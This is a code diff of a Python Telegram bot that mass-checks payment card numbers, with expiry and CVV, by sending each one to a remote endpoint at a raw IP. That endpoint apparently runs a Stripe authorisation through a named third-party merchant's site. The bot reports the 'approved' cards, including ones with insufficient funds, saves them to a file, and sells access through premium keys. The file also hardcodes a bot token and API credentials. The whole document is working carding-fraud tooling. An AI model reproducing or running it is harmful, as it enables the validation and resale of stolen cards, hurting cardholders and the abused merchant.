@@ -1,21 +1,22 @@
-from telethon import TelegramClient, events, Button
+from telethon import TelegramClient, events
 import json, os, re, asyncio, datetime
 import aiohttp
 import aiofiles
 
 # ================== CONFIG ==================
+API_ID = 37235723          # Keep these (can be dummy)
+API_HASH = "880a876edaf529c8493b873d47821ec2"  # Keep these
 BOT_TOKEN = "8783810252:AAEv2GtOJYG_-iBv1AMjvV8Le3kZBo9FJb0"
+
 ADMIN_ID = [5248903529, 8496671308, 1308204344, 7856977111, 7029965057, 5295792382, 1965289355, 8467239599, 7249106493, 7292047135, 8368859527, 7582867285]
 
 # Files
 PREMIUM_FILE = "premium.json"
 BANNED_FILE = "banned_users.json"
-KEYS_FILE = "keys.json"
 CC_FILE = "approved.txt"
 
-# ================== STRIPE CHECKER WITH SITE ==================
+# ================== STRIPE CHECKER ==================
 async def check_stripe(card):
-    """Stripe Auth using redbluechair.com"""
     try:
         url = f"http://138.128.240.15:8009/stripe_auth?cc={card}&site=redbluechair.com"
         
@@ -23,13 +24,11 @@ async def check_stripe(card):
         async with aiohttp.ClientSession(timeout=timeout) as session:
             async with session.get(url) as res:
                 if res.status != 200:
-                    return {"Response": f"HTTP Error", "Status": "Declined", "Gateway": "Stripe Auth"}
+                    return {"Response": "HTTP Error", "Status": "Declined"}
                 
                 data = await res.json()
                 response_text = data.get("Response", str(data))
-                gateway = data.get("Gate", "Stripe Auth")
                 
-                # Clean JSON response
                 if isinstance(response_text, str) and response_text.startswith("{"):
                     try:
                         rj = json.loads(response_text)
@@ -40,16 +39,12 @@ async def check_stripe(card):
                 lower = str(response_text).lower()
                 status = "Approved" if any(x in lower for x in ["approved", "success", "insufficient_funds"]) else "Declined"
                 
-                return {
-                    "Response": str(response_text)[:250],
-                    "Status": status,
-                    "Gateway": gateway
-                }
+                return {"Response": str(response_text)[:250], "Status": status}
     except Exception as e:
-        return {"Response": f"Error: {str(e)[:100]}", "Status": "Declined", "Gateway": "Stripe Auth"}
+        return {"Response": f"Error: {str(e)[:80]}", "Status": "Declined"}
 
 
-# ================== UTILITY FUNCTIONS ==================
+# ================== UTILITIES ==================
 async def load_json(filename):
     try:
         if not os.path.exists(filename):
@@ -68,11 +63,7 @@ async def is_premium_user(user_id):
     data = await load_json(PREMIUM_FILE)
     if str(user_id) not in data: return False
     expiry = datetime.datetime.fromisoformat(data[str(user_id)]['expiry'])
-    if datetime.datetime.now() > expiry:
-        del data[str(user_id)]
-        await save_json(PREMIUM_FILE, data)
-        return False
-    return True
+    return datetime.datetime.now() <= expiry
 
 async def is_banned_user(user_id):
     data = await load_json(BANNED_FILE)
@@ -83,50 +74,37 @@ async def save_approved(card, response):
         await f.write(f"{card} | APPROVED | {response}\n")
 
 
-# ================== BOT CLIENT ==================
-client = TelegramClient('stripe_bot', api_id=None, api_hash=None)
+# ================== BOT ==================
+client = TelegramClient('stripe_bot', API_ID, API_HASH)
 
-# ================== COMMANDS ==================
 @client.on(events.NewMessage(pattern=r'(?i)^[/.](start|help)$'))
 async def start(event):
     if await is_banned_user(event.sender_id):
         return await event.reply("🚫 You are banned!")
-    
-    await event.reply("""**🔥 Stripe Auto Checker**
-
-Commands:
-• `/mst` → Mass Check Stripe
-• `/redeem <key>` → Redeem Premium Key
-• `/info` → Your Information""")
+    await event.reply("**🔥 Stripe Checker Bot**\nUse /mst to check cards")
 
 @client.on(events.NewMessage(pattern=r'(?i)^[/.]mst'))
 async def mst(event):
     if await is_banned_user(event.sender_id):
-        return await event.reply("🚫 You are banned!")
+        return await event.reply("🚫 Banned!")
     
     if event.is_private and not await is_premium_user(event.sender_id):
-        return await event.reply("Premium required in private chat.")
+        return await event.reply("Premium required in PM.")
 
-    # Extract Cards
-    if event.reply_to_msg_id:
-        replied = await event.get_reply_message()
-        text = replied.text or ""
-    else:
-        text = event.raw_text
-
+    text = (await event.get_reply_message()).text if event.reply_to_msg_id else event.raw_text
     cards = re.findall(r'\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', text)
     
     if not cards:
-        return await event.reply("❌ No valid cards found!")
+        return await event.reply("No valid cards found!")
 
-    cards = cards[:100]  # Limit
-    asyncio.create_task(process_mass_stripe(event, cards))
+    cards = cards[:80]
+    asyncio.create_task(process_mass(event, cards))
 
 
-async def process_mass_stripe(event, cards):
+async def process_mass(event, cards):
     total = len(cards)
     checked = approved = 0
-    status_msg = await event.reply(f"🔥 **Stripe Checker Running**\nTotal Cards: {total}")
+    status_msg = await event.reply(f"🔥 Checking {total} cards...")
 
     for i in range(0, len(cards), 8):
         batch = cards[i:i+8]
@@ -135,34 +113,24 @@ async def process_mass_stripe(event, cards):
 
         for card, res in zip(batch, results):
             if isinstance(res, Exception):
-                res = {"Response": "Timeout", "Status": "Declined"}
-
+                res = {"Response": "Error", "Status": "Declined"}
+            
             checked += 1
             if res.get("Status") == "Approved":
                 approved += 1
                 await save_approved(card, res.get("Response"))
-                await event.reply(f"""💎 **STRIPE APPROVED**
+                await event.reply(f"💎 **APPROVED**\n`{card}`\n{res.get('Response')}")
 
-`{card}`
-Response: {res.get('Response')}""")
-
-            progress = f"""**🔄 Stripe Mass Check**
-✅ Approved: {approved}
-📊 Progress: {checked}/{total}"""
             try:
-                await status_msg.edit(progress)
+                await status_msg.edit(f"**Progress**\nApproved: {approved}\nChecked: {checked}/{total}")
             except:
                 pass
-
             await asyncio.sleep(1.1)
 
-    await status_msg.edit(f"""✅ **Check Completed!**
-
-✅ Approved: **{approved}**
-Total Checked: **{total}**""")
+    await status_msg.edit(f"✅ Done!\nApproved: {approved}/{total}")
 
 
-# ================== START BOT ==================
+# ================== RUN ==================
 async def main():
     print("🚀 Stripe Bot Started | Site: redbluechair.com")
     await client.start(bot_token=BOT_TOKEN)
